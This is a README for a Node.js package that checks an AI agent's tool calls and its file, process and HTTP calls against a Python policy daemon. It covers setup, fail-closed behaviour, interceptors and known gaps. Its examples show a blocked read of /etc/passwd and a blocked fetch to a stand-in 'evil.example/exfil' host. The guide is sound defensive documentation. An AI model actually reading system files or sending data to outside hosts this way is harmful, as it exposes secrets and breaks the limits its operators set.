# interlock-guard for Node.js

Guard a Node.js agent's tool calls with **the same policy engine** the Python
[interlock](../README.md) library uses.

This is not a port. There is one engine and one set of rules, and both live in
Python. You run a small Python daemon, `interlock-sidecar`, next to your Node.js
agent. Before each guarded call, this package sends the call to the daemon over
a unix socket and gets back a verdict: allow, block, rewrite, or ask a human.
The call only runs if the verdict allows it. Because there's no second implementation, the
JS side can't drift from the Python one.

Use it when your agent is written in Node.js and you want the same guardrails
(and the same rules) as your Python services.

> **Warning: this package needs a running daemon, and by default it fails closed.**
> There is no engine bundled in the JS package. If the daemon isn't running,
> can't be reached, or dies mid-session, **every guarded call is denied** with a
> `BlockedError`. No warning, no pass-through. An agent without its daemon does
> not act at all, unless you choose otherwise with `unreachable` (below).
>
> This includes `monitor` mode. An unreachable daemon is an infrastructure
> failure, not a policy decision, so it is never turned into a silent allow.
>
> The trade-off: you must deploy a Python process beside your JS agent, and
> "is the daemon up?" becomes a hard availability dependency. If that doesn't
> work for you, this package isn't the right fit.

## Install

The package is **not on npm yet**. Build it from this repository:

```bash
cd js
npm install
npm run build          # compiles src/ to dist/
```

You need Node.js 20 or newer, and the Python package for the daemon:

```bash
pip install "git+https://github.com/SourceShift/InterLock.git"
```

The JS package has no runtime dependencies. It is **ESM only** (there is no
CommonJS build).

## Start the daemon

The daemon ships with the Python package. Point it at the rules you want to
enforce:

```bash
interlock-sidecar --rules my_service.policies:RULES --socket "$HOME/.interlock/guard.sock"
```

> **Note**
> Don't put the socket directly in `/tmp`. The daemon refuses a shared
> directory (world-writable or sticky, like `/tmp`) and never changes its
> permissions. Use a directory you own, like `~/.interlock/` above.

`--rules` takes a `module:attribute` path to your rule set, which is written in
Python (see [Writing rules](../docs/guides/writing-rules.md)). The daemon refuses
to start with an empty rule set, because an empty engine allows everything and
would look healthy while enforcing nothing.

The socket is created with `0600` permissions inside a `0700` directory. Whoever
can open the socket can ask for verdicts, so treat its path as part of your
security boundary. Every flag is documented in the
[sidecar reference](../docs/reference/sidecar.md).

## Guard an MCP client

Wrap your MCP client once. Every `callTool` is then checked before it reaches
the server.

```ts
import { homedir } from "node:os";
import { join } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { BlockedError, RemoteEngine, guardMcpSession } from "interlock-guard";

const engine = new RemoteEngine(join(homedir(), ".interlock", "guard.sock"), { timeout: 5 });
const client = new Client({ name: "my-agent", version: "1.0.0" });

guardMcpSession(client, { engine });

await client.callTool({ name: "echo", arguments: { text: "hi" } });
// allowed: the call reached the server

await client.callTool({ name: "read_file", arguments: { path: "/etc/passwd" } });
// throws BlockedError: blocked action 'read_file': ...
// the server never heard about the call
```

`guardMcpSession` doesn't import the MCP SDK. It wraps any object with a
`callTool({ name, arguments })` method, so the official `Client` works unchanged
and so does a test double. Results are checked too, on the way back.

> **Note:** `RemoteEngine` waits at most `timeout` seconds for the connection
> and for each reply. The default is 5 seconds (`DEFAULT_TIMEOUT_SECONDS`). When
> it runs out, the call fails closed with a `BlockedError` (`no reply within 5s`),
> so a hung daemon blocks calls instead of hanging them. The timer only runs
> while a reply is pending, so an idle pause between calls never trips it. Pass
> `{ timeout: null }` to wait without limit, which you should only do in tests.

When a call is blocked, the `BlockedError` carries the whole decision, so you can
log why:

```ts
try {
  await client.callTool({ name: "read_file", arguments: { path: "/etc/passwd" } });
} catch (err) {
  if (err instanceof BlockedError) {
    console.log(err.action);                  // "read_file"
    console.log(err.decision.reason);         // why the policy said no
    console.log(err.decision.policy_id);      // which rule
    console.log(err.decision.attributed_to);  // which argument, e.g. "path"
  }
}
```

## Guard any tool call

If your agent doesn't use MCP, call the two functions underneath
`guardMcpSession` yourself, before and after running a tool:

```ts
import { enforceToolCall, enforceToolResult } from "interlock-guard";

const safeArgs = await enforceToolCall("shell", { cmd }, { engine });
const output = await runShell(safeArgs);
const safeOutput = await enforceToolResult("shell", output, { engine });
```

- `enforceToolCall` returns a **copy** of the arguments, with any rewrite merged
  in. Your original object is never changed.
- `enforceToolResult` returns the original result when allowed, and a
  replacement when the policy rewrote it. (The policy sees the result wrapped as
  `{ result: ... }` when it isn't an object. That wrapper never leaks out to you.)
- Both throw `BlockedError` on a block. Blocking a result doesn't undo the tool:
  it has already run. It only keeps the output away from your agent.

Pass `enforcement: "monitor"` to record decisions without acting on them, and
`principal: "acme/agent42"` to say who is acting. Pass the same `callId` to both
calls to link their receipts (`guardMcpSession` does this for you).

### Ask a human

A rule can return `Decision.escalate(...)`: legal, but a person must decide.
Pass `onEscalate` to decide. It resolves `true` to run this one call; anything
else (including a throw, or no callback at all) rejects with `NotApprovedError`,
a `BlockedError`:

```ts
const options = {
  engine,
  onEscalate: async (request) => askOnCall(request.action, request.reason, request.args),
};
```

`request.reason` is one line of at most 512 bytes. A block from any rule wins
over an escalation, so you're only asked about calls nothing refused. A verdict
this client doesn't know is blocked.

### When the daemon is down

```ts
new RemoteEngine(path, { unreachable: "deny" });                       // default
new RemoteEngine(path, { unreachable: "degraded", fallbackKeyFile: "/etc/interlock/key" });
new RemoteEngine(path, { unreachable: "allow" });
```

`degraded` decides calls with the offline fallback policy the daemon signed
(`interlock-sidecar --fallback-policy FILE --key-file KEY`), and blocks if that
file is missing, tampered or stale. `allow` lets every call through. Both call
`onFallback` (default `process.emitWarning`) on every call they decide, and
`engine.fallbacks` counts them. A daemon that answers with an error is reachable
and refusing, so it always blocks. See the
[sidecar reference](../docs/reference/sidecar.md#when-the-daemon-is-down).

## Guard your app's fs, exec, and fetch calls

Tool calls aren't the only risk. An agent can also read files, run commands, and
send HTTP requests directly. `installInterceptors` patches those functions for
the whole process and checks each one **before it happens**:

```ts
import fs from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { RemoteEngine, installInterceptors } from "interlock-guard";

const engine = new RemoteEngine(join(homedir(), ".interlock", "guard.sock"), { timeout: 5 });
const interceptors = installInterceptors({ engine });

interceptors.covered;    // ["child_process.exec", "child_process.execFile", "fs.access", ..., "http.fetch"]
interceptors.uncovered;  // what can't be guarded (see below)

await fs.promises.readFile("/etc/passwd");  // BlockedError: the file is never read
await fetch("http://evil.example/exfil");   // BlockedError: nothing leaves the process

interceptors.uninstall();  // restores every patched function
```

Pass `{ fs: false }`, `{ exec: false }`, or `{ http: false }` to skip a group.

Each effect reaches your rules as an action with a namespaced name, so a raw
`fetch` can't be confused with an MCP tool that happens to be called `fetch`:

| Action | Arguments your rule sees |
|---|---|
| `fs.readFile`, `fs.writeFile`, `fs.rm`, `fs.rename`, `fs.open`, `fs.opendir`, … (24 in total) | `path`, plus `data`, `dest`, `options`, `flags`, etc. where the function takes them |
| `child_process.exec` | `command`, `options` |
| `child_process.execFile` | `command` (the file), `args`, `options` |
| `http.fetch` | `url` (a string, `URL`, or `Request`), plus `method`, `headers`, `body` when given |

A Python rule then reads `event.action == "fs.rm"` and `event.args["path"]`. A
rewrite changes the argument (`path`, `command`, `url`), and the effect uses the
rewritten value.

Path-carrying arguments (`path`, `dest`, `target`, `file`) reach the rule as
**text**: a `Buffer`/`Uint8Array` path is decoded as UTF-8, and a `file://`
`URL` becomes a filesystem path (any other URL keeps its `href`). The caller's
original argument is left untouched unless the policy actually rewrites it, and
binary payloads such as `writeFile`'s `data` are never converted. A
`fetch(new Request(...))` input contributes its own `url`, `method`, and
`headers`; an explicit `init` still overrides them. A `Request` body is **not**
inspected: when a rewritten url forces a rebuild, the guard clones the Request
first, so the caller's body is forwarded rather than consumed and stays
readable.

## Guard a model SDK's tools

If your agent calls tools through a model SDK (Anthropic, OpenAI, or your own
loop), guard the place where your code runs the tool the model asked for:

```ts
import { guardToolMap, guardToolRunner } from "interlock-guard";

// a { name: fn } record of tool functions
const tools = guardToolMap({ read_file, shell, search }, { engine });

// or a (name, args) => result dispatcher
const run = guardToolRunner(myDispatcher, { engine });
```

Neither imports a model SDK. Both check the call before it runs **and** the
result after, through the same `enforceToolCall` / `enforceToolResult` used
everywhere else. So one rule behaves the same whether your agent uses MCP, a
model SDK, or a hand-written loop.

For `guardToolMap`: when a tool's first argument is a plain object, its own keys
are what the policy sees and rewrites. Any other first argument (a string, a
`Buffer`, nothing) is shown to the policy as `{ input: ... }`.

Every trailing argument the wire can carry is visible too, under the reserved
key `positional_args`: a tool called as `(input, context)` shows the policy
`{ input, positional_args: [context] }`, and a MODIFY whose `positional_args` is
an array replaces the trailing arguments. An object-only call keeps the shape
above (no `positional_args`), and the synthetic key is never passed to the tool
as a key of the first argument. If a first object already has its own
`positional_args` key, the wrapper's reserved key wins.

A trailing value the codec refuses - an `AbortSignal`, a class instance, a
function - omits `positional_args` for the whole call rather than failing the
call before the tool runs. The policy cannot see what cannot be sent, and the
tool still receives the argument untouched. Positions are never compacted, so
an index into `positional_args` always names the same real argument.

## What can't be guarded

Some parts of Node can't be reached by any patch written in JavaScript. These
gaps are permanent, so they're listed by name in `installInterceptors().uncovered`
(and in the exported `UNGUARDABLE` array) rather than left for you to discover.

- **ESM named imports.** `import { readFile } from "node:fs"` and
  `import * as fs from "node:fs"` are bound to the original function when the
  module loads, and no patch can redirect them. The report names this hole
  `esm.named-import`; it is a binding, not an action, so no rule can fire on it. Only `require("node:fs")` and a
  **default** import (`import fs from "node:fs"`, which is the same object) see
  the interceptor. Write your agent's file and process code with default imports
  or `require`.
- **Synchronous calls and calls that return a handle.** A guard has to wait for
  the daemon's verdict before the effect, so anything that must return a value
  immediately is out of reach:
  - every `*Sync` function (`readFileSync`, `rmSync`, `execSync`, …)
  - functions that return a stream synchronously: `fs.createReadStream`,
    `fs.createWriteStream`
  - `child_process.spawn` and `child_process.fork`, which return a live
    `ChildProcess`
  - `http.request`, `http.get`, `https.request`, `https.get`, which return a
    request object synchronously

  `child_process.exec` and `execFile`, `fs.open` and `fs.opendir` **are**
  guarded. Their callback forms report through the callback and their promise
  forms (`fs.promises.open`, `fs.promises.opendir`) already return a promise, so
  a decision-first wrapper does not steal a synchronous handle.
- **Result checks on fs, exec, and fetch.** The interceptors check the call, not
  what it returns. An `fs` call can return a `Stats`, a `Dirent`, or a stream,
  which can't be sent to the daemon, so checking results would turn an ordinary
  `fs.stat` into a block. Result checks and redaction happen on the MCP and
  model-SDK paths, where the result is a tool payload.

## Limits

- **Async only.** Node has no synchronous unix-socket client, so
  `RemoteEngine.evaluate()` returns a promise. A synchronous JS tool function
  can't be guarded, because there's no synchronous way to ask the daemon. MCP's
  `callTool` is already async, so it fits.
- **One connection, one call at a time.** A `RemoteEngine` holds a single socket
  connection, and requests on it can't be interleaved. Concurrent guarded calls
  queue behind each other instead of racing. Create more `RemoteEngine`s if you
  need more in flight.
- **Each guarded call costs a round trip.** `npm run bench` prints the overhead.
  On the development machine it measured about 47 µs per guarded call, against
  about 0.4 µs unguarded (an earlier, less loaded run measured about 26 µs).
  Treat this as a smoke number, not a benchmark: the overhead benchmark with a
  stated method is still on the [roadmap](../ROADMAP.md). Every guarded `fs`,
  `exec`, or `fetch` call adds one round trip.
- **Some values are refused instead of converted.** `undefined`, `NaN`,
  `±Infinity`, `bigint`, `Map`, `Date`, class instances, and objects with
  `Symbol` keys throw `Unrepresentable`. These are values `JSON.stringify` would
  silently drop or corrupt, which could hand the engine an event with nothing to
  object to, and so allow it. Refusing turns that silent allow into a visible
  block. Bytes (`Buffer`, `Uint8Array`) and `Set`s are supported; everything else
  must be plain JSON. The one exception is a `guardToolMap` trailing argument:
  an unrepresentable value omits `positional_args` instead of blocking the
  call, so the guard never refuses a call over an argument it merely could not
  show the policy.
- **Path projection is textual, and lossy in one direction.** A `Buffer` path
  reaches the policy as its UTF-8 string. That is the encoding a filesystem path
  is made of, but a byte sequence that is not valid UTF-8 cannot round-trip
  exactly; the rule sees the replacement-character form. A non-`file:` `URL` in
  a path field keeps its `href` rather than throwing, and a `Request` body is
  not inspected.
- **No audit receipts from JS.** The Python side writes a signed receipt for each
  decision. Here the daemon already records the decision when it answers (start
  it with `--receipts`), so the JS client doesn't write a second, unsigned copy.
- **ESM only, Node 20+, not yet on npm.**

## Imports

| Import | What you get |
|---|---|
| `interlock-guard` | everything |
| `interlock-guard/mcp` | `enforceToolCall`, `enforceToolResult`, `guardMcpSession` |
| `interlock-guard/wire` | the protocol: canonical JSON, the value codec, frames, `WireError`, `Unrepresentable` |

## Development

```bash
npm install
npm run build          # tsc -p tsconfig.build.json  -> dist/
npm test               # tsc -p tsconfig.test.json && node --test  -> dist-test/
npm run bench          # the guarded round-trip smoke number
```

`npm test` starts the **real** Python daemon. If it can't start one, the suite
**fails** and prints the daemon's stderr instead of skipping, because a skipped
conformance test is a green suite that proves nothing. Set `PYTHON=...` to choose
the interpreter (the default is `python3`).

What the tests cover:

- `test/corpus.test.ts` is the centre of the suite. It replays
  [`tests/conformance/events.json`](../tests/conformance/events.json), the same
  frozen corpus the Python tests replay: 13 cases and 9 protocol negatives, each
  checking that this client reads a decision exactly as the engine made it. This
  corpus is the contract between the two languages.
- `test/mcp_sdk.test.ts` wraps a real `@modelcontextprotocol/sdk` `Client` over
  an in-memory transport.
- `test/fs.test.ts`, `test/exec.test.ts`, and `test/http.test.ts` drive the
  interceptors against a real daemon. The HTTP test uses a real server to prove a
  blocked request never leaves the process.
- `test/install.test.ts` pins the coverage report and checks that `uninstall`
  restores everything.
- `test/model.test.ts` covers `guardToolMap` and `guardToolRunner`; `test/shapes.test.ts` covers the projection helpers and the event-only write-back rule.
- `test/client.test.ts`, `test/mcp.test.ts`, and `test/wire.test.ts` cover the
  client, the MCP wrapper, and the protocol codec.
- `test/timeout.test.ts` checks the default timeout and the `timeout: null`
  opt-out, that a daemon which never replies blocks the call once the timeout
  runs out, and that an idle pause between calls doesn't trip the reply timer.

## Learn more

- [interlock README](../README.md): what interlock is and how the Python side works
- [Concepts](../docs/concepts.md): events, rules, verdicts, and phases
- [Writing rules](../docs/guides/writing-rules.md): the Python rules this package enforces
- [Sidecar reference](../docs/reference/sidecar.md): every daemon flag and the wire protocol

## License

Apache-2.0. See [LICENSE](../LICENSE).
